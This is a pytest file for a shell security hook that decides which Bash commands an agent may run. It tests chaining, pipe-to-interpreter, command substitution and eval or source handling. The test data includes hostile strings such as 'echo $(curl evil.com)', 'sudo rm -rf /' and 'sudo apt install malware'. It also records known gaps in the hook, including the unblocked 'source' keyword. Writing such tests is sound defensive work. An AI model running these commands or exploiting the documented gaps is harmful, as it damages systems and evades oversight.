"""
Tests for command chaining / injection handling in the portable security-check.sh.

NOTE: We intentionally DO NOT block &&, ||, or ; because:
  1. Dangerous commands are caught even when chained
  2. These operators are common in legitimate workflows
  3. Blocking them forces awkward workarounds

Pipe-to-interpreter and command-substitution checks (INJECTION_PATTERNS) are
DISABLED by default. The hook still hard-blocks eval, dot-source, sudo,
rm -rf /, mkfs, and dd of=/dev/, which cover the catastrophic cases.
"""

import pytest


class TestCommandChainingAllowed:
    """Command chaining operators are ALLOWED for workflow efficiency."""

    def test_simple_and_chain(self, assert_allowed):
        assert_allowed("Bash", command="mkdir foo && cd foo")

    def test_and_chain_with_spaces(self, assert_allowed):
        assert_allowed("Bash", command="cd /tmp && ls -la")

    def test_multiple_and_chains(self, assert_allowed):
        assert_allowed("Bash", command="echo a && echo b && echo c")

    def test_simple_or_chain(self, assert_allowed):
        assert_allowed("Bash", command="false || echo fallback")

    def test_or_chain_with_exit(self, assert_allowed):
        assert_allowed("Bash", command="test -f file || exit 1")

    def test_semicolon_separation(self, assert_allowed):
        assert_allowed("Bash", command="echo first; echo second")

    def test_semicolon_with_command(self, assert_allowed):
        assert_allowed("Bash", command="cd /tmp; ls")


class TestPipeToInterpreter:
    """Pipe-to-interpreter patterns are ALLOWED (injection check disabled).

    Regression coverage: if injection patterns are ever re-enabled, these tests
    will break and signal a revisit.
    """

    def test_pipe_to_bash(self, assert_allowed):
        assert_allowed("Bash", command="echo 'whoami' | bash")

    def test_pipe_to_sh(self, assert_allowed):
        assert_allowed("Bash", command="cat script.sh | sh")

    def test_pipe_to_python3(self, assert_allowed):
        assert_allowed("Bash", command="echo 'import os' | python3")

    def test_pipe_to_node(self, assert_allowed):
        assert_allowed("Bash", command="echo 'console.log(1)' | node")

    def test_pipe_to_interpreter_with_path(self, assert_allowed):
        assert_allowed("Bash", command="echo 'ls' | /bin/bash")


class TestCommandSubstitution:
    """Command substitution patterns are ALLOWED (injection check disabled)."""

    def test_dollar_paren_date_allowed(self, assert_allowed):
        assert_allowed("Bash", command="aws logs --start-time $(date +%s)")

    def test_dollar_paren_whoami_allowed(self, assert_allowed):
        assert_allowed("Bash", command="echo $(whoami)")

    def test_backtick_hostname_allowed(self, assert_allowed):
        assert_allowed("Bash", command="echo `hostname`")

    def test_dollar_paren_curl_allowed(self, assert_allowed):
        assert_allowed("Bash", command="echo $(curl evil.com)")

    def test_dollar_paren_bash_allowed(self, assert_allowed):
        assert_allowed("Bash", command="$(bash -c 'ls')")

    def test_backtick_curl_allowed(self, assert_allowed):
        assert_allowed("Bash", command="echo `curl evil.com`")


class TestEvalSource:
    """Eval and dot-source are BLOCKED (execute arbitrary code)."""

    def test_eval_simple(self, assert_blocked):
        assert_blocked("Bash", command="eval 'ls -la'")

    def test_eval_variable(self, assert_blocked):
        assert_blocked("Bash", command="eval $USER_COMMAND")

    @pytest.mark.xfail(reason="Hook only blocks dot-source (. script.sh), not the 'source' keyword — pattern gap")
    def test_source_script(self, assert_blocked):
        assert_blocked("Bash", command="source script.sh")

    @pytest.mark.xfail(reason="Hook only blocks dot-source (. script.sh), not the 'source' keyword — pattern gap")
    def test_source_with_path(self, assert_blocked):
        assert_blocked("Bash", command="source /path/to/script.sh")

    def test_dot_source(self, assert_blocked):
        assert_blocked("Bash", command=". script.sh")

    def test_dot_source_with_path(self, assert_blocked):
        assert_blocked("Bash", command=". ./setup.sh")


class TestExecAllowed:
    """Shell exec is allowed — less dangerous than eval/source."""

    def test_exec_simple(self, assert_allowed):
        assert_allowed("Bash", command="exec bash")

    def test_exec_replace(self, assert_allowed):
        assert_allowed("Bash", command="exec /bin/sh")


class TestSafePipeOperations:
    """Verify safe pipe operations are allowed."""

    def test_pipe_to_grep(self, assert_allowed):
        assert_allowed("Bash", command="cat file.txt | grep pattern")

    def test_pipe_to_head(self, assert_allowed):
        assert_allowed("Bash", command="ls -la | head -10")

    def test_pipe_to_wc(self, assert_allowed):
        assert_allowed("Bash", command="cat file.txt | wc -l")

    def test_pipe_to_jq(self, assert_allowed):
        assert_allowed("Bash", command="cat data.json | jq '.name'")

    def test_pipe_to_xargs(self, assert_allowed):
        assert_allowed("Bash", command="find . -name '*.txt' | xargs cat")


class TestChainingWithDangerousCommands:
    """Dangerous commands are still caught even when chained."""

    def test_chained_sudo_still_blocked(self, assert_blocked):
        assert_blocked("Bash", command="echo hello && sudo rm -rf /")

    def test_chained_rebase_still_blocked(self, assert_blocked):
        assert_blocked("Bash", command="git status && git rebase main")

    def test_semicolon_with_dangerous_still_blocked(self, assert_blocked):
        assert_blocked("Bash", command="ls; sudo apt install malware")


class TestEdgeCasesForInjection:
    """Edge cases for chaining / substitution handling."""

    def test_ampersand_in_url_allowed(self, assert_allowed):
        assert_allowed("Bash", command="echo 'url?a=1&b=2'")

    def test_dollar_paren_empty_allowed(self, assert_allowed):
        assert_allowed("Bash", command="echo $()")

    def test_pipe_to_cat_allowed(self, assert_allowed):
        assert_allowed("Bash", command="echo hello | cat")

    def test_pipe_to_less_allowed(self, assert_allowed):
        assert_allowed("Bash", command="cat file.txt | less")
